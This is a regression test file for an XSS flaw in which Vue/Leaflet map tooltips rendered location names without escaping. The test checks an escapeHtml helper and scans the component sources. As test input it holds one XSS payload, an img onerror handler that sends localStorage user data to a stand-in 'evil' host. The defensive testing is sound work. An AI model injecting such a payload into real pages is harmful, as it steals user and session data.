// Regression: F-S1 — DashboardMapCard rendered API-supplied location names and
// addresses into a Leaflet tooltip unescaped. Leaflet sets string tooltip
// content via innerHTML, and the backend accepts writes without auth, so a
// malicious NAP/location name would run script in any admin's session.
// Found by /cso on 2026-08-30.
import { test, describe } from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const dashboardMap = path.resolve(__dirname, '../src/components/DashboardMapCard.vue')
const lcpNapMap = path.resolve(__dirname, '../src/views/LcpNapMap.vue')

// The escapeHtml both map components use, extracted for a live behavioural check.
const escapeHtml = (value) => String(value ?? '').replace(/[&<>"']/g, ch => ({
  '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
}[ch]))

describe('Map tooltip XSS (regression F-S1)', () => {
  test('escapeHtml neutralises an onerror payload', () => {
    const payload = '<img src=x onerror=fetch("//evil/"+localStorage.user)>'
    const out = escapeHtml(payload)
    // Once the angle brackets are encoded the payload is inert text, so no
    // <img> element is ever created and the onerror handler never runs.
    assert.ok(!out.includes('<img'), 'the tag must not survive as markup')
    assert.ok(!out.includes('<'), 'no raw < may remain to open a tag')
    assert.ok(out.includes('&lt;img'), 'angle brackets must be entity-encoded')
  })

  test('every HTML-significant character is encoded', () => {
    assert.equal(escapeHtml(`&<>"'`), '&amp;&lt;&gt;&quot;&#39;')
  })

  test('DashboardMapCard escapes tooltip content before binding it', () => {
    const src = fs.readFileSync(dashboardMap, 'utf8')
    assert.ok(src.includes('const escapeHtml'), 'DashboardMapCard must define escapeHtml')
    // The tooltip name/address must be run through escapeHtml, not interpolated raw.
    assert.ok(
      /const locationName = escapeHtml\(/.test(src),
      'location name must be escaped before it reaches bindTooltip'
    )
    assert.ok(
      /const locAddress = escapeHtml\(/.test(src),
      'location address must be escaped before it reaches bindTooltip'
    )
    // Guard against the raw form regressing back in.
    assert.ok(
      !/const locationName = site\.name \|\|/.test(src),
      'the unescaped location name assignment must not return'
    )
  })

  test('both map components escape tooltip content', () => {
    for (const [name, file] of [['DashboardMapCard', dashboardMap], ['LcpNapMap', lcpNapMap]]) {
      const src = fs.readFileSync(file, 'utf8')
      const tooltips = src.match(/bindTooltip\([\s\S]*?\)/g) || []
      assert.ok(tooltips.length > 0, `${name} should bind at least one tooltip`)
      for (const t of tooltips) {
        // Any ${...} interpolation inside a tooltip string must be an escaped
        // value or a locally-derived number, never a raw site.* field.
        const rawField = /\$\{site\.(name|street|barangay|city|nap)\b/.test(t)
        assert.ok(!rawField, `${name} tooltip must not interpolate a raw site field: ${t.slice(0, 80)}`)
      }
    }
  })
})
